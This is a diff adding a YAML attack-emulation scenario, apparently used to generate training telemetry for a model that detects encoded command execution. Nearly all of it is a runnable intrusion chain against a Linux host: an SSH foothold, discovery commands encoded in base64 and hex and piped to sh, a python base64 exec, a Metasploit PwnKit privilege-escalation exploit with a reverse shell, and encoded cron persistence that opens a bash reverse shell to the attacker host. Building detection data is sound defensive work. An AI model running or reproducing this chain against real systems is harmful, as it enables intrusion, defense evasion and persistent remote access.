@@ -1,0 +1,55 @@
+###
+# L2 — obfuscated variant (T1027 Obfuscated Files / T1140 Deobfuscate+Decode). Split: TRAIN.
+# Same chain as L1 but discovery+persistence are delivered base64/hex-encoded, to teach the model
+# the encoded-exec pattern real attackers use (base64 | base64 -d | sh ; printf hex | xxd -r). The
+# decoded payloads are benign discovery — the point is the ENCODING signature, not new behaviour.
+# AUTHORIZED LAB ONLY. Written, not executed.
+vars:
+  $VICTIM1: 172.31.250.228
+  $ATTACKER: 172.31.250.253
+  $WEBUSER: www-data
+  $SVC_PASS: CHANGE_ME_lab_service_pw
+
+commands:
+  - type: ssh
+    cmd: "id\n"
+    hostname: $VICTIM1
+    username: $WEBUSER
+    password: $SVC_PASS
+    creates_session: foothold
+    metadata: { description: "assume-breach foothold", techniques: "T1190,T1078.003", tactics: "Initial Access" }
+
+  # base64-encoded discovery (blob built at runtime so it is always correct)
+  - type: ssh
+    cmd: "B=$(printf 'whoami; id; uname -a; getent passwd' | base64 -w0); echo \"stager=$B\"; echo \"$B\" | base64 -d | sh\n"
+    session: foothold
+    metadata: { description: "base64-encoded discovery stager", techniques: "T1027,T1140,T1082", tactics: "Defense Evasion,Discovery", telemetry: "execve: base64 -d | sh (encoded-exec signature)" }
+
+  # hex-encoded discovery (alternate encoder)
+  - type: ssh
+    cmd: "H=$(printf 'ss -tnp; ps aux' | xxd -p | tr -d '\\n'); echo \"$H\" | xxd -r -p | sh\n"
+    session: foothold
+    metadata: { description: "hex-encoded discovery stager", techniques: "T1027,T1140,T1049,T1057", tactics: "Defense Evasion,Discovery", telemetry: "execve: xxd -r -p | sh" }
+
+  # python inline-decode variant (what the ML tokenizer AST-parses)
+  - type: ssh
+    cmd: "python3 -c \"import base64,os; os.system(base64.b64decode('ZmluZCAvIC1wZXJtIC00MDAwIC10eXBlIGYgMj4vZGV2L251bGw=').decode())\"\n"
+    session: foothold
+    metadata: { description: "python base64 inline-exec (SUID hunt)", techniques: "T1027,T1059.006,T1083", tactics: "Defense Evasion,Discovery", telemetry: "python3 -c base64.b64decode(...).os.system" }
+
+  # privesc (pkexec)
+  - type: msf-module
+    cmd: exploit/linux/local/cve_2021_4034_pwnkit_lpe_pkexec
+    session: foothold
+    creates_session: root
+    exit_on_error: False
+    options: { WRITABLE_DIR: /tmp }
+    payload_options: { LHOST: $ATTACKER, LPORT: 4457 }
+    payload: linux/x64/shell/reverse_tcp
+    metadata: { description: "PwnKit LPE", techniques: "T1068", tactics: "Privilege Escalation" }
+
+  # encoded cron persistence
+  - type: ssh
+    cmd: "P=$(printf '*/10 * * * * /bin/bash -i >& /dev/tcp/$ATTACKER/4467 0>&1' | base64 -w0); (crontab -l 2>/dev/null; echo \"$P\" | base64 -d) | crontab -\n"
+    session: foothold
+    metadata: { description: "base64-encoded cron persistence", techniques: "T1027,T1053.003", tactics: "Persistence", telemetry: "filemod /var/spool/cron*; decoded via base64 -d" }
